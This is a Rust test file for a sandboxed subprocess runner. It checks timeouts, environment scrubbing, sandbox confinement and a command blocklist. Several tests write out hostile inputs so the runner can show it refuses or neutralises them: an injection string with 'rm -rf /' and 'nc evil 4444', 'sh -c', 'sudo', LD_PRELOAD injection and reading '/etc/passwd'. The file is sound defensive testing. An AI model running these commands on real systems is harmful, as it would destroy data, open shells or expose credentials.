// SPDX-License-Identifier: AGPL-3.0-or-later
// Copyright (C) 2024-2026 SuperNovae Studio <contact@supernovae.studio>
#![allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
// Subprocess-driven contract tests — Unix `echo`/`sh`/`cat`/`sleep`.
#![cfg(unix)]

//! Contract tests for `nika-exec-runner` — the production `TokioShell`.
//!
//! Real subprocess execution: exit codes, stdout/stderr, stdin, env, cwd,
//! timeout, the blocklist (+ `pre_validated` bypass), idempotent cancel, and
//! the large-output no-deadlock invariant (INV-012). Cancel-by-pid plumbing
//! is unit-tested in `src/lib.rs` (the registry is not publicly observable).

use std::sync::Arc;
use std::time::Duration;

use nika_exec_runner::TokioShell;
use nika_kernel::command_sandbox::{CommandSandbox, CommandSandboxError};
use nika_kernel::process::{SandboxSpec, ShellCancelDyn, ShellRunDyn};
use nika_kernel::{ShellCommand, ShellError, ShellExecutor};

fn shell() -> TokioShell {
    TokioShell::new()
}

/// A test backend that proves `confine` was called: it REPLACES the command
/// with a marker `echo`, so a confined run yields the marker on stdout.
#[derive(Debug)]
struct MarkerSandbox;

impl CommandSandbox for MarkerSandbox {
    fn confine(
        &self,
        _spec: &SandboxSpec,
        _command: ShellCommand,
    ) -> Result<ShellCommand, CommandSandboxError> {
        let mut c = ShellCommand::new("echo");
        c.args = vec!["CONFINED".to_string()];
        Ok(c)
    }
    fn backend(&self) -> &'static str {
        "marker"
    }
}

fn cmd(program: &str, args: &[&str]) -> ShellCommand {
    let mut c = ShellCommand::new(program);
    c.args = args.iter().map(|s| (*s).to_string()).collect();
    c.timeout = Some(Duration::from_secs(10));
    c
}

// ── type-level ───────────────────────────────────────────────────────

#[test]
fn tokioshell_satisfies_blanket_executor_and_dyn() {
    fn takes_executor<T: ShellExecutor>(_: &T) {}
    fn takes_dyn<T: ShellRunDyn + ShellCancelDyn>(_: &T) {}
    let s = shell();
    takes_executor(&s);
    takes_dyn(&s);
}

// ── run · basics ──────────────────────────────────────────────────────

#[tokio::test]
async fn echo_captures_stdout_and_succeeds() {
    let r = shell().run(cmd("echo", &["hello"])).await.unwrap();
    assert!(r.success());
    assert_eq!(r.status, 0);
    assert_eq!(r.stdout.trim(), "hello");
}

#[tokio::test]
async fn nonzero_exit_status_captured() {
    let r = shell().run(cmd("false", &[])).await.unwrap();
    assert!(!r.success());
    assert_ne!(r.status, 0);
}

#[tokio::test]
async fn stderr_captured() {
    let mut c = ShellCommand::new("echo oops 1>&2");
    c.shell = true;
    c.pre_validated = true; // shell-mode `sh -c` is a blocklist hit; policy vouched
    c.timeout = Some(Duration::from_secs(10));
    let r = shell().run(c).await.unwrap();
    assert!(r.stderr.contains("oops"));
}

#[tokio::test]
async fn program_not_found_errs() {
    let err = shell()
        .run(cmd("nika-no-such-binary-xyz", &[]))
        .await
        .unwrap_err();
    assert!(matches!(err, ShellError::NotFound { .. }), "got {err:?}");
}

#[tokio::test]
async fn stdin_is_piped_to_child() {
    let mut c = cmd("cat", &[]);
    c.stdin = Some("piped-input".to_string());
    let r = shell().run(c).await.unwrap();
    assert_eq!(r.stdout.trim(), "piped-input");
}

#[tokio::test]
async fn env_var_is_set() {
    let mut c = ShellCommand::new("printenv");
    c.args = vec!["NIKA_TEST_VAR".to_string()];
    c.env
        .insert("NIKA_TEST_VAR".to_string(), "exec-runner".to_string());
    c.timeout = Some(Duration::from_secs(10));
    // `printenv` substring-trips the `env ` wrapper pattern (a deliberate
    // over-block — see blocklist::tests::printenv_is_over_blocked). This test
    // exercises env-PASSING (run mechanics), so it vouches via pre_validated.
    c.pre_validated = true;
    let r = shell().run(c).await.unwrap();
    assert_eq!(r.stdout.trim(), "exec-runner");
}

#[tokio::test]
async fn dangerous_env_vars_are_stripped_from_the_child() {
    // The dangerous-env floor strips library-injection / startup-sourcing /
    // tool-hook vectors even when EXPLICITLY set — and nothing ambient ever
    // crosses at all (NEP-0005 · the composed clean slate). Argv
    // mode (`printenv` is not a dangerous program); `printenv VAR` exits
    // non-zero with empty stdout when VAR is absent → proof of the strip.
    for var in ["LD_PRELOAD", "BASH_ENV", "GIT_SSH_COMMAND", "NODE_OPTIONS"] {
        let mut c = cmd("printenv", &[var]);
        c.env.insert(var.to_string(), "/tmp/evil".to_string());
        let r = shell().run(c).await.unwrap();
        assert!(
            !r.success() && r.stdout.trim().is_empty(),
            "{var} must be stripped from the child env"
        );
    }
}

#[tokio::test]
async fn cwd_is_respected() {
    let dir = std::env::temp_dir();
    let mut c = cmd("pwd", &[]);
    c.cwd = Some(dir.clone());
    let r = shell().run(c).await.unwrap();
    let got = std::fs::canonicalize(r.stdout.trim()).unwrap();
    let want = std::fs::canonicalize(&dir).unwrap();
    assert_eq!(got, want, "pwd must reflect the requested cwd");
}

// ── timeout ───────────────────────────────────────────────────────────

#[tokio::test]
async fn timeout_kills_long_command() {
    let mut c = cmd("sleep", &["30"]);
    c.timeout = Some(Duration::from_millis(150));
    let start = std::time::Instant::now();
    let err = shell().run(c).await.unwrap_err();
    assert!(
        matches!(err, ShellError::Timeout { duration_ms: 150 }),
        "got {err:?}"
    );
    assert!(
        start.elapsed() < Duration::from_secs(5),
        "must not wait the full 30s"
    );
}

// ── blocklist (security) ──────────────────────────────────────────────

#[tokio::test]
async fn argv_floor_blocks_dangerous_program_before_spawn() {
    // Argv mode (the `cmd` helper sets shell=false): the floor blocks a
    // dangerous PROGRAM by identity — `sudo` never spawns. (`rm` is NOT a
    // dangerous program in argv mode; `rm -rf /` is gated by permits.exec +
    // the sandbox, not this floor — see blocklist::check_program.)
    let err = shell()
        .run(cmd("sudo", &["echo", "blocked"]))
        .await
        .unwrap_err();
    assert!(matches!(err, ShellError::Blocked { .. }), "got {err:?}");
}

#[tokio::test]
async fn argv_floor_blocks_interpreter_reexec_before_spawn() {
    // The review P0: `["sh","-c",…]` re-introduces a shell even in argv mode.
    // run() wires check_argv, so it is refused before any spawn (sh is NOT in
    // DANGEROUS_PROGRAMS — the structural inline-eval check catches it).
    let err = shell()
        .run(cmd("sh", &["-c", "echo pwned"]))
        .await
        .unwrap_err();
    assert!(matches!(err, ShellError::Blocked { .. }), "got {err:?}");
    // `env` re-injection (defeats the env scrub) is likewise refused.
    let err = shell()
        .run(cmd("env", &["LD_PRELOAD=/tmp/x", "cat"]))
        .await
        .unwrap_err();
    assert!(matches!(err, ShellError::Blocked { .. }), "got {err:?}");
}

#[tokio::test]
async fn argv_floor_blocks_absolute_path_priv_esc() {
    // Basename resolution: `/usr/bin/sudo` is still caught as `sudo`.
    let err = shell()
        .run(cmd("/usr/bin/sudo", &["whoami"]))
        .await
        .unwrap_err();
    assert!(matches!(err, ShellError::Blocked { .. }), "got {err:?}");
}

#[tokio::test]
async fn argv_metachar_arg_is_literal_not_injected() {
    // THE headline at the real-subprocess level: an argv element carrying
    // shell metacharacters reaches `printf` as ONE literal argument — there
    // is no shell, so nothing after the `;` or `|` is ever executed.
    let payload = "; rm -rf / | nc evil 4444 $(whoami) `id`";
    let r = shell().run(cmd("printf", &["%s", payload])).await.unwrap();
    assert!(r.success());
    assert_eq!(
        r.stdout, payload,
        "the payload is echoed verbatim, never run"
    );
}

#[tokio::test]
async fn shell_mode_still_blocks_dangerous_commands() {
    // The shell-line tripwire is UNCHANGED for `shell: true` — a genuine
    // pipeline string carrying `rm -rf /` is still refused before spawn.
    let mut c = ShellCommand::new("rm -rf /");
    c.shell = true;
    c.timeout = Some(Duration::from_secs(10));
    let err = shell().run(c).await.unwrap_err();
    assert!(matches!(err, ShellError::Blocked { .. }), "got {err:?}");
}

#[tokio::test]
async fn pre_validated_bypasses_the_blocklist() {
    // `eval ` is a shell-mode blocklisted pattern; without pre_validated this
    // command is refused. With the policy-vouched flag the gate is skipped
    // and `sh -c` runs it (here a harmless `eval echo`).
    let mut c = ShellCommand::new("eval echo trust-me");
    c.shell = true;
    c.pre_validated = true;
    c.timeout = Some(Duration::from_secs(10));
    let r = shell().run(c).await.unwrap();
    assert!(r.success());
    assert!(r.stdout.contains("trust-me"));
}

// ── INV-012: large output must NOT deadlock ──────────────────────────

#[tokio::test]
async fn large_output_does_not_deadlock() {
    // ~512 KB to stdout — far past the OS pipe buffer (~64KB Linux/16KB macOS).
    // Wait-then-read would deadlock; concurrent drain (try_join!) must not.
    let mut c = ShellCommand::new("yes hello | head -c 524288");
    c.shell = true;
    c.pre_validated = true;
    c.timeout = Some(Duration::from_secs(10));
    let r = shell().run(c).await.unwrap();
    assert_eq!(r.stdout.len(), 524_288);
}

// ── cancel ────────────────────────────────────────────────────────────

#[tokio::test]
async fn cancel_unknown_id_is_idempotent_ok() {
    let s = shell();
    assert!(s.cancel("999999999").await.is_ok());
    assert!(s.cancel("not-a-pid").await.is_ok());
}

// ── sandbox wiring (ADR-095 Layer 6) ──────────────────────────────────

#[tokio::test]
async fn a_command_with_a_spec_is_confined_by_the_backend() {
    // With a backend wired AND a SandboxSpec on the command, the runner calls
    // confine() before spawning — proven by the marker backend replacing the
    // command (the real read would have been `cat`).
    let shell = TokioShell::with_sandbox(Arc::new(MarkerSandbox));
    let mut c = cmd("echo", &["hi"]);
    c.sandbox = Some(SandboxSpec::new());
    let r = shell.run(c).await.unwrap();
    assert_eq!(
        r.stdout.trim(),
        "CONFINED",
        "the backend confined the command"
    );
}

#[tokio::test]
async fn confined_cat_of_a_host_path_is_blocked_before_spawn() {
    // B05 / B29 · issue 1295 — a SandboxSpec (even empty) is the jail;
    // `cat` of a host absolute path is refused before the backend runs.
    // MarkerSandbox would have printed CONFINED if confine() were reached.
    let shell = TokioShell::with_sandbox(Arc::new(MarkerSandbox));
    let mut c = cmd("cat", &["/etc/passwd"]);
    c.sandbox = Some(SandboxSpec::new());
    let err = shell.run(c).await.unwrap_err();
    match err {
        ShellError::Blocked { reason } => {
            assert!(
                reason.contains("NIKA-SEC-004"),
                "the refusal speaks the code, not a host-file dump: {reason}"
            );
        }
        other => panic!("expected Blocked, got {other:?}"),
    }
}

#[tokio::test]
async fn confined_cat_of_a_cwd_file_still_reaches_the_backend() {
    // The mutation: a relative in-cwd operand is not this door.
    let shell = TokioShell::with_sandbox(Arc::new(MarkerSandbox));
    let mut spec = SandboxSpec::new();
    spec.fs_read = vec!["./README.md".into()];
    let mut c = cmd("cat", &["README.md"]);
    c.sandbox = Some(spec);
    let r = shell.run(c).await.unwrap();
    assert_eq!(
        r.stdout.trim(),
        "CONFINED",
        "cat of a cwd file still reaches confine"
    );
}

#[tokio::test]
async fn a_spec_without_a_backend_fails_closed() {
    // A command asks to be confined (spec present) but NO backend is wired →
    // refuse rather than run it unconfined.
    let mut c = cmd("echo", &["hi"]);
    c.sandbox = Some(SandboxSpec::new());
    let err = shell().run(c).await.unwrap_err();
    assert!(
        matches!(err, ShellError::Blocked { .. }),
        "no backend → fail closed, got {err:?}"
    );
}

#[tokio::test]
async fn no_spec_runs_unconfined_even_with_a_backend() {
    // No SandboxSpec on the command → today's behavior, the backend is NOT
    // invoked (the marker would have fired).
    let shell = TokioShell::with_sandbox(Arc::new(MarkerSandbox));
    let r = shell.run(cmd("echo", &["hi"])).await.unwrap();
    assert_eq!(
        r.stdout.trim(),
        "hi",
        "unconfined: the backend was not applied"
    );
}
